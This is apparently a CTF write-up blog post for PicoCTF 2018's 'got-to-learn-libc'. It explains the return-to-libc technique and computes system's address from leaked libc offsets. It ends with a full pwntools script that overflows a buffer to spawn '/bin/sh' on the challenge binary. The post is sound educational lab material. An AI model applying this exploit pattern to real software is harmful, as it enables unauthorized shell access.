---
layout: post
title: Binary Exploitation: got-to-learn-libc (250) - PicoCTF 2018
categories: [general, CTFs]
tags: [CTFs, picoCTF2018]
fullview: true
comments: true
---

So this challenge was a great introduction for the concept of ret-2-libc.
As we run the binary we were given a several addresses from libc, that may be really  useful in our exploit.
> Here are some useful addresses:
> 
> puts: 0xf7e2bb40
>
> fflush 0xf7e29cb0
>
> read: 0xf7eaacb0
>
> write: 0xf7eaad80
>
> useful_string: 0x56575030

*Keep in mind that this addresses are random when running the binary on  the remote server due to ASLR.

So apparently we get the addresses of some functions that can be found in libc, as well as an address of a "useful_string".
By examine the binary with GDB we can view the content of this particular address, and we found out that it points to the following string

>  gdb-peda$ x/s 0x56557030
>
> 0x56557030 <**useful_string**>: "/bin/sh"

Knowing that our goal is getting a shell, having the address of `"/bin/sh"` is very useful. Basically our goal is to find a way to call `system` with `"/bin/sh"`, as it will result with a shell on the remote server, and the ability to view the content of flag.txt.

# So what is actually the "ret-2-libc" technique? 
Simply put, "return-to-libc" allows us to bypass protections like NX on the stack which defeat execution from stack. So even if we have a buffer-overflow (And we do have one in this challenge), we can't just write our shell-code to the stack and overwrite the return address to jump back to it and execute the shell-code, because the stack is protected.
What we can do, however, is to use the fact we have a buffer overflow to create a fake function stack frame, consisting of the address of a function that is already loaded into the process' memory (`system`) and give it an appropriate argument (in this case, the address of `"/bin/sh"`).

* You may check the following article to get a better grip and knowledge about ret-2-libc - [Return-to-libc - ExploitDB](https://www.exploit-db.com/docs/english/28553-linux-classic-return-to-libc-&-return-to-libc-chaining-tutorial.pdf) 


So the stack should look like this:

|Before|
|---|
|**Lower Memory Address**|
|Real Return Address|
|something|
|something|
|**Higher Memory Address**|


**And After:**

| |
|---|
|**Lower Memory Address**|
|System's Address|
|Fake Return Address |
|"/bin/sh" Address|
|**Higher Memory Address**|


Notice that we use a fake return address because when a function is called the arguments are pushed first, and then the return address is pushed as well.


# Getting the address of system 
It's about time we'll take advantage of the functions' address we got.
Basically, we only need an libc address of one function.
As I mentioned earlier there is a possibility  we have an ASLR protection on the remote server so the address of `system` is different each time, but the difference between the address of another libc function (`puts` for example) and the address of `system` is always the same - offsets don't change.

Since we have access to libc in the path `lib/i386-linux-gnu/libc.so.6`we can use `readelf` to get the offset of puts from the `libc base address` and than adding to that address the offset of `system` which will give us the long-awaited address of `system`.
So `readelf -s lib/i386-linux-gnu/libc.so.6 | grep puts` gave us the offset `0x5f140`, and `readelf -s lib/i386-linux-gnu/libc.so.6 | grep system` gave us the offset `0x3a940`. 

# The script
```python
from pwn import *

addresses = {}
SYSTEM_OFFSET = 0x3a940
PUTS_OFFSET = 0x5f140

def get_useful_addresses():
	r.recvline()
	r.recvline()
	add = r.recvuntil("Enter")
	for address in add.split("\n"): 
		if address != "" and address != "Enter" and ":" in address:
			addresses[address.split(": ")[0]] = address.split(": ")[1] 

def handle_logic():
	get_useful_addresses()
	r.recvuntil("ring:")
	libc_base_address = hex((int(addresses['puts'], 16) - PUTS_OFFSET))
	system_libc_address = hex(int(libc_base_address, 16) + SYSTEM_OFFSET)
	print ("libc base address - " + libc_base_address)
	print ("system libc address - " + system_libc_address)
	payload = "A"*160
	payload += p32(int(system_libc_address, 16))
	payload += p32(int("0xdeadbeef", 16)) 
	payload += p32(int(addresses['useful_string'],16))
	r.sendline(payload)
	

if __name__ == "__main__":
	r = process(['./vuln'])
	handle_logic()
	r.interactive()
```

